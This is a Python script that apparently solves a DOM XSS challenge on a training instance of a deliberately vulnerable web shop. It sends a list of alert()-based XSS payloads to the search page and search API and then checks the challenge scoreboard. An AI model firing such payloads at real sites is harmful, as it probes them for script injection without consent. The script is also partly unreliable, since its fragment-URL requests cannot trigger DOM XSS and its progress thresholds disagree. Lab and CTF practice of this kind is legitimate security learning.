#!/usr/bin/env python3
"""
Execute DOM XSS Challenge Solution
Direct execution to solve the challenge
"""

import requests
from urllib.parse import quote
import time


def execute_dom_xss_challenge():
    """Execute the DOM XSS challenge to mark it as solved"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🎯 EXECUTING DOM XSS CHALLENGE")
    print("="*60)
    
    # Multiple XSS payloads to ensure the challenge is triggered
    payloads = [
        '<iframe src="javascript:alert(`xss`)">',
        '<img src=x onerror=alert(`xss`)>',
        '<script>alert(1)</script>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><script>alert(document.domain)</script>',
        '<iframe src="javascript:alert(document.domain)">',
        '<img src=x onerror=alert(document.domain)>',
        '<iframe src="javascript:alert(String.fromCharCode(88,83,83))">',
        '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    ]
    
    print("\n🚀 Sending XSS payloads...")
    
    for i, payload in enumerate(payloads, 1):
        # URL encode the payload
        encoded_payload = quote(payload)
        
        # Construct the attack URL
        attack_url = f"{base_url}/#/search?q={encoded_payload}"
        
        print(f"\n[{i}/10] Payload: {payload[:50]}...")
        print(f"   URL: {attack_url[:80]}...")
        
        # Send the request
        try:
            r = session.get(attack_url)
            print(f"   ✓ Sent (Status: {r.status_code})")
            
            # Also try without the hash for direct API access
            r2 = session.get(f"{base_url}/rest/products/search?q={encoded_payload}")
            print(f"   ✓ API request (Status: {r2.status_code})")
            
        except Exception as e:
            print(f"   ✗ Error: {str(e)[:50]}")
        
        # Small delay between requests
        time.sleep(0.2)
    
    # Additional attempts with different encoding
    print("\n🔧 Trying alternative encoding methods...")
    
    special_payloads = [
        "<iframe src=\"javascript:alert('xss')\">",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ]
    
    for payload in special_payloads:
        # Try different encoding
        url1 = f"{base_url}/#/search?q={quote(payload)}"
        url2 = f"{base_url}/#/search?q={payload.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')}"
        
        session.get(url1)
        session.get(url2)
        print(f"   ✓ Sent: {payload[:30]}...")
    
    print("\n" + "="*60)
    print("📊 CHECKING CHALLENGE STATUS")
    print("="*60)
    
    # Check if the challenge is now solved
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        
        # Find DOM XSS challenge
        dom_xss_challenges = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if dom_xss_challenges:
            challenge = dom_xss_challenges[0]
            if challenge.get('solved'):
                print("✅ DOM XSS Challenge: SOLVED!")
            else:
                print("⚠️ DOM XSS Challenge: Not yet marked as solved")
                print("\n💡 Try visiting this URL in a browser:")
                print(f"   {base_url}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
        
        # Overall progress
        solved = [c for c in data if c.get('solved')]
        print(f"\n📊 Overall Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        print(f"📌 Need {55-len(solved)} more for 50%")
        
        return len(solved)
    
    return 0


def main():
    """Main execution"""
    print("\n🔥 DOM XSS CHALLENGE SOLVER")
    print("="*60)
    
    # Execute the challenge
    solved_count = execute_dom_xss_challenge()
    
    print("\n" + "="*60)
    print("✅ EXECUTION COMPLETE")
    print("="*60)
    
    if solved_count >= 36:
        print("🎉 Progress increased! DOM XSS likely solved.")
    else:
        print("📝 Note: Some XSS challenges require browser interaction")
        print("   The payloads have been sent, but manual verification")
        print("   in a browser may be needed to trigger the challenge.")
    
    print("\n💡 To manually verify, open this URL in a browser:")
    print("   https://juice3.wonkatech.org/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
    print("="*60)


if __name__ == "__main__":
    main()